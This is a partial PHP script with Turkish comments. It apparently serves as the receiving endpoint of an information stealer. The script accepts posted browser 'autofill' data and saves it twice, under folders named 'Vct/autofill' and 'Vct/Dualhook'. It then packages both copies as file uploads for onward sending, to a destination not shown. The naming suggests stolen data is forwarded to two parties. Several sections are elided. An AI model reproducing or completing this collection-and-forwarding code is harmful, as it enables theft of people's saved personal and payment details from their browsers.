...
$autofill = isset($data['autofill']) ? $data['autofill'] : null;

// Eksik key veya autofill değeri varsa hata dön
if (!$key || !$autofill) {
    http_response_code(400);
    echo json_encode(array("error" => "Missing key or autofill data"));
    exit;
}

// Klasörleri oluştur
$directories = ["./Vct", "./Vct/autofill", "./Vct/Dualhook"];
...
$file_written1 = file_put_contents("./Vct/autofill/{$randomstring}.txt", $autofill);
$file_written2 = file_put_contents("./Vct/Dualhook/{$randomstring}.txt", $autofill);

// Dosya yazma sırasında hata oluşursa
if ($file_written1 === false || $file_written2 === false) {
    http_response_code(500);
...
$autofillData = array(
    'file' => new CURLFile("./Vct/autofill/{$randomstring}.txt")
);

$dualhookData = array(
    'file' => new CURLFile("./Vct/Dualhook/{$randomstring}.txt")
);
